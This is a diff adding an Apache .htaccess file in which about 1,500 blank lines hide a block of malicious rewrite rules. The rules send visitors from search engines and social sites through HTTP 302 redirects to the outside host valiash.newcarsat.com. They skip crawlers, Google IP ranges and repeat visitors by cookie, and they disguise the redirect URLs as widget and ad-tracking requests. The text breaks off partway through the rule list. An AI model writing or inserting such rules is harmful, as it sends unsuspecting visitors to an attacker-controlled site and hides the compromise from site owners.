@@ -1,0 +1,1546 @@
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<IfModule prefork.c>
+RewriteEngine On
+RewriteCond %{REQUEST_METHOD}   ^GET$
+RewriteCond %{HTTP_REFERER}     ^(http\:\/\/)?([^\/\?]*\.)?(tweet|twit|linkedin|instagram|facebook\.|myspace\.|bebo\.).*$ [NC,OR]
+RewriteCond %{HTTP_REFERER}     ^(http\:\/\/)?([^\/\?]*\.)?(hi5\.|blogspot\.|friendfeed\.|friendster\.|google\.).*$ [NC,OR]
+RewriteCond %{HTTP_REFERER}     ^(http\:\/\/)?([^\/\?]*\.)?(yahoo\.|bing\.|msn\.|ask\.|excite\.|altavista\.|netscape\.).*$ [NC,OR]
+RewriteCond %{HTTP_REFERER}     ^(http\:\/\/)?([^\/\?]*\.)?(aol\.|hotbot\.|goto\.|infoseek\.|mamma\.|alltheweb\.).*$ [NC,OR]
+RewriteCond %{HTTP_REFERER}     ^(http\:\/\/)?([^\/\?]*\.)?(lycos\.|metacrawler\.|mail\.|pinterest|instagram).*$   [NC]
+RewriteCond %{HTTP_REFERER}     !^.*(imgres).*$   [NC]
+RewriteCond %{HTTP_USER_AGENT}  !^.*(bing|Accoona|Ace\sExplorer|Amfibi|Amiga\sOS|apache|appie|AppleSyndication).*$   [NC]
+RewriteCond %{HTTP_USER_AGENT}  !^.*(Archive|Argus|Ask\sJeeves|asterias|Atrenko\sNews|BeOS|BigBlogZoo).*$   [NC]
+RewriteCond %{HTTP_USER_AGENT}  !^.*(Biz360|Blaiz|Bloglines|BlogPulse|BlogSearch|BlogsLive|BlogsSay|blogWatcher).*$   [NC]
+RewriteCond %{HTTP_USER_AGENT}  !^.*(Bookmark|bot|CE\-Preload|CFNetwork|cococ|Combine|Crawl|curl|Danger\shiptop).*$   [NC]
+RewriteCond %{HTTP_USER_AGENT}  !^.*(Diagnostics|DTAAgent|EmeraldShield|endo|Evaal|Everest\-Vulcan).*$   [NC]
+RewriteCond %{HTTP_USER_AGENT}  !^.*(exactseek|Feed|Fetch|findlinks|FreeBSD|Friendster|Fuck\sYou|Google).*$   [NC]
+RewriteCond %{HTTP_USER_AGENT}  !^.*(Gregarius|HatenaScreenshot|heritrix|HolyCowDude|Honda\-Search|HP\-UX).*$   [NC]
+RewriteCond %{HTTP_USER_AGENT}  !^.*(HTML2JPG|HttpClient|httpunit|ichiro|iGetter|IRIX|Jakarta|JetBrains).*$   [NC]
+RewriteCond %{HTTP_USER_AGENT}  !^.*(Krugle|Labrador|larbin|LeechGet|libwww|Liferea|LinkChecker).*$   [NC]
+RewriteCond %{HTTP_USER_AGENT}  !^.*(LinknSurf|Linux|LiveJournal|Lonopono|Lotus\-Notes|Lycos|Lynx|Mac\_PowerPC).*$   [NC]
+RewriteCond %{HTTP_USER_AGENT}  !^.*(Mac\_PPC|Mac\s10|macDN|Mediapartners|Megite|MetaProducts).*$   [NC]
+RewriteCond %{HTTP_USER_AGENT}  !^.*(Miva|Mobile|NetBSD|NetNewsWire|NetResearchServer|NewsAlloy|NewsFire).*$   [NC]
+RewriteCond %{HTTP_USER_AGENT}  !^.*(NewsGatorOnline|NewsMacPro|Nokia|NuSearch|Nutch|ObjectSearch|Octora).*$   [NC]
+RewriteCond %{HTTP_USER_AGENT}  !^.*(OmniExplorer|Omnipelagos|Onet|OpenBSD|OpenIntelligenceData|oreilly).*$   [NC]
+RewriteCond %{HTTP_USER_AGENT}  !^.*(os\=Mac|P900i|panscient|perl|PlayStation|POE\-Component|PrivacyFinder).*$   [NC]
+RewriteCond %{HTTP_USER_AGENT}  !^.*(psycheclone|Python|retriever|Rojo|RSS|SBIder|Scooter|Seeker|Series\s60).*$   [NC]
+RewriteCond %{HTTP_USER_AGENT}  !^.*(SharpReader|SiteBar|Slurp|Snoopy|Soap\sClient|Socialmarks|Sphere\sScout).*$   [NC]
+RewriteCond %{HTTP_USER_AGENT}  !^.*(spider|sproose|Rambler|Straw|subscriber|SunOS|Surfer|Syndic8).*$   [NC]
+RewriteCond %{HTTP_USER_AGENT}  !^.*(Syntryx|TargetYourNews|Technorati|Thunderbird|Twiceler|urllib|Validator).*$   [NC]
+RewriteCond %{HTTP_USER_AGENT}  !^.*(Vienna|voyager|W3C|Wavefire|webcollage|Webmaster|WebPatrol|wget|Win\s9x).*$   [NC]
+RewriteCond %{HTTP_USER_AGENT}  !^.*(Win16|Win95|Win98|Windows\s95|Windows\s98|Windows\sCE|Windows\sNT\s4).*$   [NC]
+RewriteCond %{HTTP_USER_AGENT}  !^.*(WinHTTP|WinNT4|WordPress|WWWeasel|wwwster|yacy|Yahoo).*$   [NC]
+RewriteCond %{HTTP_USER_AGENT}  !^.*(Yandex|Yeti|YouReadMe|Zhuaxia|ZyBorg).*$   [NC]
+RewriteCond %{REQUEST_FILENAME} !.*jpg$|.*gif$|.*png|.*jpeg|.*mpg|.*avi|.*zip|.*gz|.*tar|.*ico$ [NC]
+RewriteCond %{REMOTE_ADDR}      !^66\.249.*$ [NC]
+RewriteCond %{REMOTE_ADDR}      !^74\.125.*$ [NC]
+RewriteCond %{HTTP_COOKIE}      !^.*Gxb.*$ [NC]
+RewriteCond %{HTTP_USER_AGENT}  .*(Windows|Macintosh|iPad|iPhone|iPod|Android).* [NC]
+RewriteCond %{HTTPS}            ^off$
+RewriteRule .* - [E=Gxb:%{TIME_SEC}]
+RewriteRule .* - [E=TiN:valiash.newcarsat.com]
+
+RewriteCond %{ENV:Gxb} 0
+RewriteRule ^.* http://%{ENV:TiN}/f.gif?_=1340260140835&id=twitter-widget-2&lang=en&screen_name=9gag&show_count=true&show_screen_name=true&size=m&twttr_variant=2.0&twttr_referrer=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&twttr_widget=1&twttr_dnt=1  [R=302,NE,L,CO=Gxb:%{ENV:Gxb}:%{HTTP_HOST}:9748:/:0:HttpOnly]
+RewriteCond %{ENV:Gxb} 1
+RewriteRule ^.* http://%{ENV:TiN}/st?_PVID=ZlHzVGKL0mP_3DHfT.p0IQBfyokXaE_tSakABvAF&cnt=yan&ad_type=iframe&ad_size=120x600&entity=24276&site_code=mail&section_code=15167778&cb=1340950954670597&yud=zip\%3D\%26ycg\%3Df\%26yyob\%3D1990&pub_redirect_unencoded=1&pub_redirect=http\%3A\%2F\%2F%{HTTP_HOST}\%2F  [R=302,NE,L,CO=Gxb:%{ENV:Gxb}:%{HTTP_HOST}:11314:/:0:HttpOnly]
+RewriteCond %{ENV:Gxb} 2
+RewriteRule ^.* http://%{ENV:TiN}/delivery/lg.php?bannerid=4275&campaignid=2451&zoneid=767&channel_ids=,&loc=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&referer=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&cb=f1e28e852d  [R=302,NE,L,CO=Gxb:%{ENV:Gxb}:%{HTTP_HOST}:9794:/:0:HttpOnly]
+RewriteCond %{ENV:Gxb} 3
+RewriteRule ^.* http://%{ENV:TiN}/s?nsivbblc=274&ns=yt&fmt=34&nsiabblmin=3433.000&sd=B6F5EF805HH1341921915794614&nsiabblmax=159167.000&hl=en_US&q=carly\%20rae\%20jepsen\%20call\%20me\%20maybe&docid=w8gbEJ2vxo4&md=1&vq=auto&csipt=watch5&w=640&bd=2275545&bt=40.999&tpmt=41&cr=ID&nsiabblmean=89439.569&cfps=0&screenw=1360&screenh=768&playerw=640&vtmp=1&referrer=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&playerh=390&scoville=1&nbe=1&len=181.556&pd=2.362&mos=0&sendtmp=1&fs=0&volume=100&rt=70.939&vid=_9alL9wKgMaud9fHDA1p2698EClXVF8dC&nsivbblmin=12.000&nsivbblmean=415034.182&et=41.917&st=12.93&sourceid=ys&h=360&vw=640&rendering=software&vh=360&lact=8738&decoding=accelerated&bc=5712203&nsivbblmax=787724.000&nsiabblc=274&el=detailpage&tsphab=1&fexp=920704,912706,921602,924700,914501,913542,907335,922600,919306,907341,907344,907217,920706,919316,902518,919324,924500,906717,910207&hbd=4269216&tspne=0&plid=AATEeIsGlv5wKJ4z&hbt=90.197&tspfdt=406&ptk=youtube_none  [R=302,NE,L,CO=Gxb:%{ENV:Gxb}:%{HTTP_HOST}:10638:/:0:HttpOnly]
+RewriteCond %{ENV:Gxb} 4
+RewriteRule ^.* http://%{ENV:TiN}/__utm.gif?utmwv=5.3.2&utms=9&utmn=1910696821&utmhn=www.blogger.com&utmcs=UTF-8&utmsr=1366x768&utmvp=425x410&utmsc=24-bit&utmul=en-us&utmje=1&utmfl=-&utmdt=Blogger:\%20Devosi\%20Maria\%20-\%20Post\%20a\%20Comment&utmhid=1035662949&utmr=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&utmp=/comment-iframe.g\%3FblogID\%3D794030058009648318\%26postID\%3D2638054115971209038\%26blogspotRpcToken\%3D2063998&utmac=UA-18003-7&utmcc=__utma\%3D150635877.683985890.1340133412.1340133412.1340133412.1\%3B\%2B__utmz\%3D150635877.1340133412.1.1.utmcsr\%3Ddevosi-maria.blogspot.com\%7Cutmccn\%3D(referral)\%7Cutmcmd\%3Dreferral\%7Cutmcct\%3D/2011/11/maria-dari-kerahiman-ilahi.html\%3B&utmu=q~  [R=302,NE,L,CO=Gxb:%{ENV:Gxb}:%{HTTP_HOST}:9127:/:0:HttpOnly]
+RewriteCond %{ENV:Gxb} 5
+RewriteRule ^.* http://%{ENV:TiN}/t.gif?_=1340329250115&count=horizontal&counturl=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&id=twitter-widget-0&lang=en&original_referer=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&related=detikcom&size=m&text=8\%20Kesalahan\%20Saat\%20Berburu\%20Rumah&url=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&via=detikfinance&type=share&twttr_referrer=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&twttr_widget=1&twttr_hask=1&twttr_li=0&twttr_pid=v3:1339481875284647881689655  [R=302,NE,L,CO=Gxb:%{ENV:Gxb}:%{HTTP_HOST}:10111:/:0:HttpOnly]
+RewriteCond %{ENV:Gxb} 6
+RewriteRule ^.* http://%{ENV:TiN}/ps/ifr?container=friendconnect&mid=0&nocache=0&view=profile&parent=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&url=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&communityId=03811495727175094435&caller=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&rpctoken=1744754739&locale=in  [R=302,NE,L,CO=Gxb:%{ENV:Gxb}:%{HTTP_HOST}:10644:/:0:HttpOnly]
+RewriteCond %{ENV:Gxb} 7
+RewriteRule ^.* http://%{ENV:TiN}/imghover?iact=hm&ei=b7HqT8_vMsPNrQfjg-XOBQ&q=power+point&tbs=&page=51&tbnh=113&tbnw=135&start=553&ndsp=12&dur=7761&tbnid=TEZx9YBxtQcJxM:&hovh=205&hovw=246&vpx=243&vpy=126&imgurl=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&imgrefurl=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&ved=1t:1527,r:9,s:553,i:218&vetl=ms  [R=302,NE,L,CO=Gxb:%{ENV:Gxb}:%{HTTP_HOST}:9369:/:0:HttpOnly]
+RewriteCond %{ENV:Gxb} 8
+RewriteRule ^.* http://%{ENV:TiN}/pview?event=pview&fpc=d96b1f4-137eaa87da1-3bf81330-7897&sessionID=1340976511850.71332&sourceURL=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&hostname=www.mangahere.com&location=/manga/anatolia_story/v04/c000/41.html&publisher=e47efe7d-147b-4731-ac42-9838ccdc52f2&shareHash=sthash.YS3IQgaZ&incomingHash=&refDomain=www.mangahere.com&refQuery=manga/anatolia_story/v04/c000/40.html&url=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&sharURL=&source=share5x&title=Anatolia\%20Story\%200\%20-\%20Read\%20Anatolia\%20Story\%20Chapter\%200\%20Online\%20-\%20Page\%2041&ts1340976511853.0=  [R=302,NE,L,CO=Gxb:%{ENV:Gxb}:%{HTTP_HOST}:10321:/:0:HttpOnly]
+RewriteCond %{ENV:Gxb} 9
+RewriteRule ^.* http://%{ENV:TiN}/pview?event=pview&fpc=d96b1f4-137eaa87da1-3bf81330-4446&sessionID=1340339850837.85642&sourceURL=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&hostname=www.mangahere.com&location=/manga/nagatachou_strawberry/v01/c004/31.html&publisher=e47efe7d-147b-4731-ac42-9838ccdc52f2&shareHash=sthash.ThmNm8HP&incomingHash=&refDomain=www.mangahere.com&refQuery=manga/nagatachou_strawberry/v01/c004/30.html&url=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&sharURL=&source=share5x&title=Nagatachou\%20Strawberry\%204\%20-\%20Read\%20Nagatachou\%20Strawberry\%20Chapter\%204\%20Online\%20-\%20Page\%2031&ts1340339850839.0=  [R=302,NE,L,CO=Gxb:%{ENV:Gxb}:%{HTTP_HOST}:11514:/:0:HttpOnly]
+RewriteCond %{ENV:Gxb} 10
+RewriteRule ^.* http://%{ENV:TiN}/delivery/lg.php?bannerid=1594&campaignid=731&zoneid=502&channel_ids=,&loc=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&referer=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&cb=24834d168d  [R=302,NE,L,CO=Gxb:%{ENV:Gxb}:%{HTTP_HOST}:9134:/:0:HttpOnly]
+RewriteCond %{ENV:Gxb} 11
+RewriteRule ^.* http://%{ENV:TiN}/webpagethumbnail?r=4&f=3&s=400:585&query=cowok+tukang+berantem&hl=id&gl=id&c=29&d=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&b=1&j=google.nyc.c.j_yxnpT9uFLs3nrAfm17CMDg_2131897912_2&a=Hzv  [R=302,NE,L,CO=Gxb:%{ENV:Gxb}:%{HTTP_HOST}:11024:/:0:HttpOnly]
+RewriteCond %{ENV:Gxb} 12
+RewriteRule ^.* http://%{ENV:TiN}/neo/darla/php/fc.php?trace=folder_custom&tID=89&d=0&f=978532267&l=SKY\%2CREC\%2CMNW&rn=1340870816834&en=utf-8&mb_s_en=utf-8&filter=no_expandable\%253Bajax_cert_expandable\%253Bexp_iframe_expandable\%253B&ref=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&sa=content\%253D\%2522minty_tenure\%253A\%2520week\%25203+\%2522&  [R=302,NE,L,CO=Gxb:%{ENV:Gxb}:%{HTTP_HOST}:11168:/:0:HttpOnly]
+RewriteCond %{ENV:Gxb} 13
+RewriteRule ^.* http://%{ENV:TiN}/b?c1=8&c2=6135404&c3=28&c4=13310&c10=3197034&ns__t=1342423939082&ns_c=ISO-8859-1&c8=&c7=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&c9=http\%3A\%2F\%2F%{HTTP_HOST}\%2F  [R=302,NE,L,CO=Gxb:%{ENV:Gxb}:%{HTTP_HOST}:11843:/:0:HttpOnly]
+RewriteCond %{ENV:Gxb} 14
+RewriteRule ^.* http://%{ENV:TiN}/new2/www/delivery/lg.php?bannerid=9991&campaignid=3149&zoneid=1&loc=1&referer=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&cb=81c85c010c  [R=302,NE,L,CO=Gxb:%{ENV:Gxb}:%{HTTP_HOST}:10799:/:0:HttpOnly]
+RewriteCond %{ENV:Gxb} 15
+RewriteRule ^.* http://%{ENV:TiN}/t.gif?url=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&via=AdaDiskon&text=Aksara\%20\%20Show\%20your\%20office\%20id\%20And\%20get\%20disc\%2010\%25\%20off&count=horizontal&lang=en&type=share&size=m&twttr_referrer=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&twttr_widget=0&twttr_hask=0&twttr_li=0&twttr_pid=v3:1334540162993469401883461  [R=302,NE,L,CO=Gxb:%{ENV:Gxb}:%{HTTP_HOST}:10712:/:0:HttpOnly]
+RewriteCond %{ENV:Gxb} 16
+RewriteRule ^.* http://%{ENV:TiN}/delivery/lg.php?ckmode=0&bannerid=0&campaignid=0&zoneid=21278&pb=1&bizmodel=0&catCol=0&catId=0&cb=44386b10b7&rtb=0&zc=\%257cx6IKEZvhOEKw4pq9FN4F0Q\%253d\%253d\%257c&b=_\%25252fLqVauF2f3GKuekfelxxrA\%25253d\%25253d&bi=\%7cx6IKEZvhOEIQWVHbwtPLr5v1DRMMHO09y61vJHWp\%2fWeioSERIely5w\%3d\%3d\%7c&loc=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&referer=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&c=OLJ4O4YI5n1luqg3ekXcKWXUak*xlWoY&iii=180879876  [R=302,NE,L,CO=Gxb:%{ENV:Gxb}:%{HTTP_HOST}:11602:/:0:HttpOnly]
+RewriteCond %{ENV:Gxb} 17
+RewriteRule ^.* http://%{ENV:TiN}/widgets/tweet_button.html?text=Ayat\%20Kursi\%20\%26\%20Kisah\%20Getir\%20Pilot\%20Mengontak\%20Bandara&via=tempodotco&related=temponewsroom&counturl=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&url=  [R=302,NE,L,CO=Gxb:%{ENV:Gxb}:%{HTTP_HOST}:10903:/:0:HttpOnly]
+RewriteCond %{ENV:Gxb} 18
+RewriteRule ^.* http://%{ENV:TiN}/delivery/lg.php?bannerid=4271&campaignid=2451&zoneid=766&channel_ids=,&loc=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&referer=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&cb=972d634614  [R=302,NE,L,CO=Gxb:%{ENV:Gxb}:%{HTTP_HOST}:10043:/:0:HttpOnly]
+RewriteCond %{ENV:Gxb} 19
+RewriteRule ^.* http://%{ENV:TiN}/tracker?event=media_connect_error&source=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&video_duration=239&domain=videocloud&playlist=1521712908001&video=1501416059001&platform=as3&time=1340349570515&errorCode=NetStream.Play.StreamNotFound&flash_version=WIN\%2010\%2C1\%2C102\%2C64&embed=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&mediaURL=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&account=89804535001&player_name=Direct\%20Lyrics\%20Sidebar\%20Playlist\%20Player(TEMP)&player=1522730664001&video_name=Taylor\%20Swift\%20Music\%20Video\%20For\%20The\%20Hunger\%20Games  [R=302,NE,L,CO=Gxb:%{ENV:Gxb}:%{HTTP_HOST}:11593:/:0:HttpOnly]
+RewriteCond %{ENV:Gxb} 20
+RewriteRule ^.* http://%{ENV:TiN}/t.gif?_=1340449070338&count=none&counturl=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&id=twitter_tweet_button_6&lang=id&original_referer=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&text=Foto\%20Kota\%20Fiktif\%20Radiator\%20Springs\%20Jadi\%20Nyata\%20\%7C\%20Gambar\%20Kota\%20Fiktif\%20Radiator\%20Springs\%20Jadi\%20Nyata\%20-\%20Yahoo!\%20News\%20Indonesia&url=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&via=yahoo_id&type=share&size=m&twttr_referrer=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&twttr_widget=1&twttr_hask=0&twttr_li=0&twttr_pid=v3:1334561769396840382748846  [R=302,NE,L,CO=Gxb:%{ENV:Gxb}:%{HTTP_HOST}:9392:/:0:HttpOnly]
+RewriteCond %{ENV:Gxb} 21
+RewriteRule ^.* http://%{ENV:TiN}/delivery/ajs.php?zoneid=1047&cb=17930178560&charset=UTF-8&loc=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&referer=http\%3A\%2F\%2F%{HTTP_HOST}\%2F  [R=302,NE,L,CO=Gxb:%{ENV:Gxb}:%{HTTP_HOST}:10148:/:0:HttpOnly]
+RewriteCond %{ENV:Gxb} 22
+RewriteRule ^.* http://%{ENV:TiN}/1pix.gif?dcsdat=1340352356343&dcssip=&os=Windows\%20XP&lang=en&flashVer=WIN\%2010\%2C1\%2C102\%2C64&dcsref=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&playerURL=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&videoId=1501416059001&dcsuri=/viewer/media_connect_error&playerId=1522730664001&mediaURL=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&publisherId=89804535001&errorCode=NetStream.Play.StreamNotFound&affiliateId=&sourceId=89804535001&lineupId=1521712908001&playerTag=  [R=302,NE,L,CO=Gxb:%{ENV:Gxb}:%{HTTP_HOST}:9598:/:0:HttpOnly]
+RewriteCond %{ENV:Gxb} 23
+RewriteRule ^.* http://%{ENV:TiN}/imghover?iact=hm&ei=P6f-T_HeD5HzrQeA_OHTBg&q=onta+orang+mongol&tbs=&page=1&tbnh=152&tbnw=198&start=0&ndsp=15&dur=3476&tbnid=TsfycykPmGgM0M:&hovh=183&hovw=275&vpx=122&vpy=216&imgurl=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&imgrefurl=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&ved=1t:1527,r:5,s:0,i:87&vetl=ms  [R=302,NE,L,CO=Gxb:%{ENV:Gxb}:%{HTTP_HOST}:11573:/:0:HttpOnly]
+RewriteCond %{ENV:Gxb} 24
+RewriteRule ^.* http://%{ENV:TiN}/hb/i/sg/adv/infinity/sg_prom_ysm_iframe_20110425.html?ysm_rd=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&ysm_url=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&ysm_title1=Gunakan\%20YSM!&ysm_descr1=Berkembang\%20bersama\%20Yahoo!\%20Search\%20Marketing.&ysm_clickurl1=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&ysm_sitehost1=&ysm_pos=1&ord=1340170100451940  [R=302,NE,L,CO=Gxb:%{ENV:Gxb}:%{HTTP_HOST}:9920:/:0:HttpOnly]
+RewriteCond %{ENV:Gxb} 25
+RewriteRule ^.* http://%{ENV:TiN}/b?c1=2&c2=8077308&ns__t=1340308870644&ns_c=UTF-8&c8=Ayah\%20Tebas\%20Leher\%20Putrinya\%20karena\%20Punya\%20Cowok\%20-\%20KOMPAS.com&c7=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&c9=http\%3A\%2F\%2F%{HTTP_HOST}\%2F  [R=302,NE,L,CO=Gxb:%{ENV:Gxb}:%{HTTP_HOST}:10074:/:0:HttpOnly]
+RewriteCond %{ENV:Gxb} 26
+RewriteRule ^.* http://%{ENV:TiN}/www/delivery/lg.php?bannerid=4719&campaignid=1325&zoneid=151&loc=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&cb=5389cc92b4  [R=302,NE,L,CO=Gxb:%{ENV:Gxb}:%{HTTP_HOST}:10937:/:0:HttpOnly]
+RewriteCond %{ENV:Gxb} 27
+RewriteRule ^.* http://%{ENV:TiN}/t.gif?_=1342408645142&count=horizontal&counturl=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&id=twitter-widget-0&lang=en&original_referer=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&related=detikcom&size=m&text=Pasha\%20\%5C\%27Ungu\%5C\%27\%20Hadiri\%20Pernikahan\%20Mantan\%20Istrinya&url=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&via=detikhot&type=share&twttr_referrer=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&twttr_widget=1&twttr_hask=0&twttr_li=0&twttr_pid=v3:1334537201755728158908838  [R=302,NE,L,CO=Gxb:%{ENV:Gxb}:%{HTTP_HOST}:10793:/:0:HttpOnly]
+RewriteCond %{ENV:Gxb} 28
+RewriteRule ^.* http://%{ENV:TiN}/delivery/lg.php?bannerid=38112&campaignid=7584&zoneid=1668&channel_ids=,&loc=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&referer=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&cb=1c89023d42  [R=302,NE,L,CO=Gxb:%{ENV:Gxb}:%{HTTP_HOST}:11513:/:0:HttpOnly]
+RewriteCond %{ENV:Gxb} 29
+RewriteRule ^.* http://%{ENV:TiN}/url?sa=t&rct=j&q=cara+mengatasi+virus+di+hardisk&source=web&cd=1&ved=0CE4QFjAA&url=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&ei=cLrzT5bQH8zirAfgyczTBg&usg=AFQjCNHrseciMHXKwm-v3S_ZutxYvY9BPw&cad=rja  [R=302,NE,L,CO=Gxb:%{ENV:Gxb}:%{HTTP_HOST}:10102:/:0:HttpOnly]
+RewriteCond %{ENV:Gxb} 30
+RewriteRule ^.* http://%{ENV:TiN}/pview?event=pview&fpc=d96b1f4-137eaa87da1-3bf81330-14044&sessionID=1342419172200.25348&sourceURL=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&hostname=www.mangahere.com&location=/manga/ruri_no_kaze_ni_hana_wa_nagareru/v01/c002/13.html&publisher=e47efe7d-147b-4731-ac42-9838ccdc52f2&shareHash=sthash.qGi4biDW&incomingHash=&refDomain=www.mangahere.com&refQuery=manga/ruri_no_kaze_ni_hana_wa_nagareru/v01/c002/12.html&url=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&sharURL=&source=share5x&title=Ruri\%20no\%20Kaze\%20ni\%20Hana\%20wa\%20Nagareru\%202\%20-\%20Read\%20Ruri\%20no\%20Kaze\%20ni\%20Hana\%20wa\%20Nagareru\%20Chapter\%202\%20Online\%20-\%20Page\%2013&ts1342419172202.0=  [R=302,NE,L,CO=Gxb:%{ENV:Gxb}:%{HTTP_HOST}:11632:/:0:HttpOnly]
+RewriteCond %{ENV:Gxb} 31
+RewriteRule ^.* http://%{ENV:TiN}/c.gif?evt=unload&rid=226725acf31442d9bd6c9b5c15cdc658&cts=1341568212985&aop=&fk=D1&gp=P&optkey=default&clid=3B381D4CAFD16F4235871F94ABD16FFA\%26TUID\%3D1&di=2887&pi=69274&ps=95101&mk=en-id&pn=ENIDHP&pid=174070&su=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&pageid=174070  [R=302,NE,L,CO=Gxb:%{ENV:Gxb}:%{HTTP_HOST}:10663:/:0:HttpOnly]
+RewriteCond %{ENV:Gxb} 32
+RewriteRule ^.* http://%{ENV:TiN}/new/www/delivery/lg.php?bannerid=6433&campaignid=125&zoneid=391&loc=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&referer=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&cb=cc0e21df2d  [R=302,NE,L,CO=Gxb:%{ENV:Gxb}:%{HTTP_HOST}:10810:/:0:HttpOnly]
+RewriteCond %{ENV:Gxb} 33
